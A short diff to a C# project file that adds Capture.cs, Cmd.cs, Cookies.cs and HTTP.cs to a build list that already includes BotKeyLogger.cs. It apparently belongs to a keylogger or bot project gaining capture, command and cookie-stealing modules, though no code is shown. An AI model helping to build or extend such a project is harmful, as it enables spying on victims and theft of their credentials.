@@ -62,6 +62,10 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="BotKeyLogger.cs" />
+    <Compile Include="Capture.cs" />
+    <Compile Include="Cmd.cs" />
+    <Compile Include="Cookies.cs" />
+    <Compile Include="HTTP.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
   </ItemGroup>
